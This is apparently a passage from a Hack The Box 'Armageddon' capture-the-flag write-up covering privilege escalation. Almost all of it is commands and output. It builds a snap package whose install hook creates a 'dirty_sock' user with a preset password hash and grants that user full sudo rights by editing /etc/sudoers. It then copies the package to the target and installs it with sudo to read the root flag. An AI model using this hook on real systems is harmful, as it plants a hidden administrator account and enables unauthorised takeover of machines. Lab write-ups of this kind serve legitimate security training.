```bash
ghohst@ghohst-VirtualBox:~$ sudo snap install --classic snapcraft
snapcraft 4.6.3 from Canonical✓ installed
ghohst@ghohst-VirtualBox:~$ cd Documents/
ghohst@ghohst-VirtualBox:~/Documents$ mkdir -p ~/mysnaps/hello
ghohst@ghohst-VirtualBox:~/Documents$ cd ~/mysnaps/
ghohst@ghohst-VirtualBox:~/mysnaps$ cd hello
ghohst@ghohst-VirtualBox:~/mysnaps/hello$ ls
ghohst@ghohst-VirtualBox:~/mysnaps/hello$ snapcraft init
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.
ghohst@ghohst-VirtualBox:~/mysnaps/hello$ ls
snap
ghohst@ghohst-VirtualBox:~/mysnaps/hello$ cd snap
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ ls
snapcraft.yaml
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ gedit snapcraft.yaml 
```

Modify the YAML to include the dirty socks description, I left the remainder at default:
```bash
name: dirty-sock
version: '0.1'
summary: Empty snap, used for exploit
description: 'See https://github.com/initstring/dirty_sock'

grade: devel # must be 'stable' to release into candidate/stable channels
confinement: devmode # use 'strict' once you have the right plugs and slots

parts:
  my-part:
    # See 'snapcraft plugins'
    plugin: nil
```

Make our hooks folder, make our 'dirty' file, modify the mode to executable:
```bash
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ mkdir hooks
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ touch hooks/dirty
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ chmod a+x hooks/dirty
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ gedit hooks/dirty
```

Modify my newly created dirty file to include the intended dirty socks commands:
```bash
#!/bin/bash

useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
usermod -aG sudo dirty_sock
echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

Build the package:
```bash
ghohst@ghohst-VirtualBox:~/mysnaps/hello/snap$ snapcraft
This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
This project is best built on 'Ubuntu 16.04', but is building on a 'Ubuntu 20.04' host.
Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
Pulling my-part 
Building my-part 
Staging my-part 
Priming my-part 
Snapping 'dirty-sock' |                                                                              
Snapped dirty-sock_0.1_amd64.snap
```

Push the file to the target machine:
```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
└─# scp dirty-sock_0.1_amd64.snap brucetherealadmin@10.10.10.233:/home/brucetherealadmin 
brucetherealadmin@10.10.10.233's password: 
dirty-sock_0.1_amd64.snap                     100% 4096    59.7KB/s   00:00 
```

Install the snap:
```bash
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install dirty-sock_0.1_amd64.snap --devmode
dirty-sock 0.1 installed
[brucetherealadmin@armageddon ~]$ 
```

Switched user to dirty sock, ran a sudo -l and confirmed I have all the permissions necessary, cat'd out the root.txt and that's that!

```bash
[dirty_sock@armageddon usr]$ sudo cat /root/root.txt
```